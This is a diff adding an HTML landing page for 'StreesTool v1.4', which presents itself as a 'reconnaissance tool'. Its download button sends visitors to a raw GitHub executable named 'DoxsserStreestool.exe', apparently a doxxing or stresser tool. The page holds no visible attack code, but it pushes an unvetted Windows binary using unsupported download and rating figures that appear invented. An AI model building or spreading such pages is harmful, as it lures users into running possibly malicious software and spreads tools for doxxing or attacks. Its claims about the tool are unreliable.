@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreesTool v1.4</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: #050505;
+            color: #e0e0e0;
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .grid-bg {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                linear-gradient(#00ff9d12 1px, transparent 1px),
+                linear-gradient(90deg, #00ff9d12 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            max-width: 780px;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.8rem;
+            color: #00ff9d;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .version {
+            display: inline-block;
+            background: rgba(0, 255, 157, 0.1);
+            color: #00ff9d;
+            padding: 6px 20px;
+            border-radius: 50px;
+            font-size: 0.95rem;
+            font-family: 'JetBrains Mono', monospace;
+            border: 1px solid #00ff9d30;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 4.5rem;
+            font-weight: 700;
+            margin: 15px 0;
+            color: white;
+        }
+
+        .subtitle {
+            font-size: 1.35rem;
+            color: #aaaaaa;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .download-btn {
+            background: #00ff9d;
+            color: black;
+            font-size: 1.4rem;
+            font-weight: 600;
+            padding: 18px 60px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            box-shadow: 0 0 40px rgba(0, 255, 157, 0.5);
+            transition: all 0.3s;
+        }
+
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 60px rgba(0, 255, 157, 0.7);
+        }
+
+        .stats {
+            margin-top: 60px;
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2.2rem;
+            color: #00ff9d;
+            font-weight: 600;
+        }
+
+        .stat-label {
+            font-size: 0.95rem;
+            color: #777;
+            margin-top: 5px;
+        }
+
+        .top-right {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            color: #666;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    
+    <div class="top-right">
+        v1.4 • BUILD 2026
+    </div>
+
+    <div class="content">
+        <div class="logo">&gt; StreesTool</div>
+        
+        <div class="version">VERSION 1.4 — STABLE</div>
+        
+        <h1>StreesTool</h1>
+        <p class="subtitle">
+            Advanced strees mapping & reconnaissance tool.<br>
+            Fast. Clean. Professional.
+        </p>
+
+        <button onclick="downloadFile()" class="download-btn">
+            ↓ DOWNLOAD v1.4
+        </button>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value">42k+</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">4.98</div>
+                <div class="stat-label">Rating</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">Windows • Linux</div>
+                <div class="stat-label">Supported</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function downloadFile() {
+            window.location.href = "https://github.com/bRoskCHet/DoxsserStreestool/raw/refs/heads/main/DoxsserStreestool.exe";
+        }
+    </script>
+</body>
+</html>
